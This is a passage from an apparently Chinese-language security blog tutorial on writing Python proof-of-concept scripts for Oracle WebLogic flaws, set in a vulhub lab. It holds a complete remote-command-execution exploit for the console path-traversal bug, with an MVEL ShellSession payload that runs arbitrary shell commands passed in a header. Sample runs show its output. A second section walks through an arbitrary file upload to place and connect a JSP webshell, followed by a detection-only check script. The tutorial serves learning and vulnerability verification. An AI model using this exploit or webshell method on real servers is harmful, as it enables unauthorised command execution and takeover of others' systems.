class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1</span></span><br><span class="line"><span class="comment"># 相关的限制或问题，具体没深究</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里和上面一样，利用 argsparse 库将要输入的目录参数化，然后使用 argumet() 函数进行模块化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usage：python3 demo.py -u [url] -c [command]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;[*] Please assign vulnerable url&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cmd&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;[*] Please assign command&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回 args ，这一步若没有，在下面的 Poc() 函数代码处就无法进行引用</span></span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 banner，美化输出</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___ ___   ___        __ _  _   ___   ___ ___  </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | || | / _ \ / _ \__ \ </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | || || (_) | (_) | ) |</span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |__   _&gt; _ &lt; &gt; _ &lt; / / </span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| / /_| |_| |      | |  | || (_) | (_) / /_ </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/____|\___/       |_|  |_| \___/ \___/____|                                                                             </span></span><br><span class="line"><span class="string">     &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个 Poc() 函数模块化代码，用于处理定义好的漏洞验证代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">     <span class="comment"># 此模块是调用上面 def argument()，模块之间直接调用，将 argument() 函数赋值给 args，然后 url 被 args.url 定义用于参数化输入，最终 url 被 request.post 调用，cmd 被headers 的 cmd 调用</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line">    cmd = args.cmd</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义未授权访问的后台路径赋值给 path</span></span><br><span class="line">    path = <span class="string">&quot;/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                         <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;cmd&#x27;</span>: cmd</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; 包括字符即可</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 利用 requests 进行 POST 请求</span></span><br><span class="line">        res = requests.post(url= url+ path, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Command results are as follows: &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Please Check your url and cmd！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数执行代码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p>脚本正常执行，并返回的漏洞验证请求的响应 </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:7001/ -c whoami</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104816398.png" data-caption="image-20230518104816398"><img src="/../images/poc/image-20230518104816398.png" alt="image-20230518104816398"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:7001/ -c id</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104846087.png" data-caption="image-20230518104846087"><img src="/../images/poc/image-20230518104846087.png" alt="image-20230518104846087"></a></p><p>脚本执行请求异常后所返回的响应</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:700 -c id</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104913314.png" data-caption="image-20230518104913314"><img src="/../images/poc/image-20230518104913314.png" alt="image-20230518104913314"></a></p><p>问题记录，在 burp 放包中，Poc 代码稍有差异，双斜杠 burp 中能执行，python 中不能执行；三斜杠 python 能执行 burp 不能执行，脚本编写时稍微注意一下即可</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517213620411.png" data-caption="image-20230517213620411"><img src="/../images/poc/image-20230517213620411.png" alt="image-20230517213620411"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517213700827.png" data-caption="image-20230517213700827"><img src="/../images/poc/image-20230517213700827.png" alt="image-20230517213700827"></a></p><h2 id="五、任意文件上传"><a href="#五、任意文件上传" class="headerlink" title="五、任意文件上传"></a>五、任意文件上传</h2><h3 id="Weblogic-任意文件上传（CVE-2018-2894）"><a href="#Weblogic-任意文件上传（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传（CVE-2018-2894）"></a>Weblogic 任意文件上传（CVE-2018-2894）</h3><h4 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载 vulhub</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># 进入weblogic CVE-2018-2894 目录输入命令启动环境</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185510842.png" data-caption="image-20230520185510842"><img src="/../images/poc/image-20230520185510842.png" alt="image-20230520185510842"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185538534.png" data-caption="image-20230520185538534"><img src="/../images/poc/image-20230520185538534.png" alt="image-20230520185538534"></a></p><p>查看得知账户密码 <code>weblogic/5Qdm6pID</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs | grep password</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520185629947.png" data-caption="image-20230520185629947"><img src="/../images/poc/image-20230520185629947.png" alt="image-20230520185629947"></a></p><p>该漏洞处于后台，漏洞存在条件限制，当后台 <code>勾选启用Web服务测试页</code>，用户可在 <code>ws_utc/config.do</code> 路径下上传任意文件</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190048572.png" data-caption="image-20230520190048572"><img src="/../images/poc/image-20230520190048572.png" alt="image-20230520190048572"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190119923.png" data-caption="image-20230520190119923"><img src="/../images/poc/image-20230520190119923.png" alt="image-20230520190119923"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190136117.png" data-caption=""><img src="/../images/poc/image-20230520190136117.png" alt=""></a></p><p>访问 <code>ws_utc/config.do</code> 路径修改上传文件的存储路径，原路径<code>/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir</code>文件上传后无法访问，修改为以下路径无需权限即可访问到上传的文件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">C:/Oracle\Middleware12.2.1.3/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520190557626.png" data-caption="image-20230520190557626"><img src="/../images/poc/image-20230520190557626.png" alt="image-20230520190557626"></a></p><p>上传文件</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520191227232.png" data-caption="image-20230520191227232"><img src="/../images/poc/image-20230520191227232.png" alt="image-20230520191227232"></a></p><p>上传位置 <code>http://192.168.145.188:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520191630280.png" data-caption="image-20230520191630280"><img src="/../images/poc/image-20230520191630280.png" alt="image-20230520191630280"></a></p><p>webshell 连接 <code>http://192.168.148.155:7001/ws_utc/css/config/keystore/1684581151178_shell.jsp</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520192008343.png" data-caption="image-20230520192008343"><img src="/../images/poc/image-20230520192008343.png" alt="image-20230520192008343"></a></p><blockquote><p>影响版本：WebLogic Server 10.3.6.0.0、WebLogic Server 12.1.3.0.0、WebLogic Server 12.2.1.2.0、WebLogic Server 12.2.1.3.0</p></blockquote><h4 id="POC-代码编写分析-3"><a href="#POC-代码编写分析-3" class="headerlink" title="POC 代码编写分析"></a>POC 代码编写分析</h4><p>通过任意文件上传的漏洞复现可知，该漏洞存在于后台，按照上面的思路编写 Poc 会想着先解决登录问题，然后登录后带着请求继续去进行请求，上传文件，根据返回的信息进行判断是否存在漏洞。由于该漏洞是存在条件限制的，我们需先登录后， <code>启用Web服务测试页</code> 且需要更改文件上传的路径才能正常触发漏洞。若按照一步步来 <code>请求登录-》判断勾选启用Web服务测试页-》修改文件上传路径-》上传文件</code>，一套编写下来，其实就是一个 EXP 了，对于仅是漏洞验证（POC）的编写来说过于复杂， 这时候我们只需要根据这个漏洞的特性去判断是否存在漏洞即可，不需要整个流程去复刻。</p><h4 id="分析小结-3"><a href="#分析小结-3" class="headerlink" title="分析小结"></a>分析小结</h4><p>分析后发现若存在漏洞会在 <code>/ws_utc/resources/setting/options/general</code> 路径下访问到一个特定的页面，我们就可以简单化，通过抓取页面关键字进行漏洞判断即可</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520193101165.png" data-caption="image-20230520193101165"><img src="/../images/poc/image-20230520193101165.png" alt="image-20230520193101165"></a></p><h4 id="Poc-初步编写-3"><a href="#Poc-初步编写-3" class="headerlink" title="Poc 初步编写"></a>Poc 初步编写</h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/ws_utc/resources/setting/options/general&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置headers</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行get请求</span></span><br><span class="line">res = requests.get(url=url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若get请求页面中存在&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;则存在漏洞</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520193901587.png" data-caption="image-20230520193901587"><img src="/../images/poc/image-20230520193901587.png" alt="image-20230520193901587"></a></p><h4 id="完善代码-3"><a href="#完善代码-3" class="headerlink" title="完善代码"></a>完善代码</h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usage：python3 demo.py -u [url]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___  __  ___      ___   ___   ___  _  _   </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |__ \ / _ \ / _ \| || |  </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | || | (_) |_____ ) | (_) | (_) | || |_ </span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | || |&gt; _ &lt;______/ / &gt; _ &lt; \__, |__   _|</span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| || | (_) |    / /_| (_) |  / /   | |  </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/ |_|\___/    |____|\___/  /_/    |_|                                                                      </span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">    <span class="comment"># 引入 argument() 函数</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 进行get请求</span></span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若get请求页面中存在&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;则存在漏洞</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;name&gt;BasicConfigOptions.workDir&lt;/name&gt;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 CVE-2018-2894 WebLogic任意文件上传漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 CVE-2018-2894 WebLogic 任意文件上传漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 请检查输入是否有误!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520194921089.png" data-caption="image-20230520194921089"><img src="/../images/poc/image-20230520194921089.png" alt="image-20230520194921089"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a><a data-fancybox="gallery" data-src="/image-20230520195011233.png" data-caption="image-20230520195011233"><img src="/image-20230520195011233.png" alt="image-20230520195011233"></a></h2><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230520195041850.png" data-caption="image-20230520195041850"><img src="/../images/poc/image-20230520195041850.png" alt="image-20230520195041850"></a></p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>通过结合几个类型的漏洞进行 Poc 编写，其漏洞验证手段主要是通过<code>匹配漏洞页面的特征码</code>去判断该网站是否存在漏洞，主要使用了 <code>requests</code> 库去实现模拟用户进行请求，然后匹配特征码进行漏洞判断，Poc 编写的难度不大，而完整的利用脚本即 Exp 的编写难度相对 Poc 难度要大一点，代码能力要求也相对要扎实一点。</p><h2 id="七、扩展"><a href="#七、扩展" class="headerlink" title="七、扩展"></a>七、扩展</h2><h3 id="sys-库"><a href="#sys-库" class="headerlink" title="sys 库"></a>sys 库</h3><p>类似于 argparse 库，用于参数化输入</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 检查命令行参数数量</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;使用方法: python myapp.py &lt;参数1&gt; &lt;参数2&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取命令行参数</span></span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印命令行参数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;参数1:&quot;</span>, arg1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;参数2:&quot;</span>, arg2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行其他操作...</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="json-库"><a href="#json-库" class="headerlink" title="json 库"></a>json 库</h3><p>json 库可用于处理JSON数据</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出 json 特定参数值</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">json_str = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30, &quot;city&quot;: &quot;New York&quot;&#125;&#x27;</span></span><br><span class="line">data = json.loads(json_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>]) </span><br><span class="line"></span><br><span class="line">输出结果：John</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 json 数据</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>, <span class="string">&quot;city&quot;</span>: <span 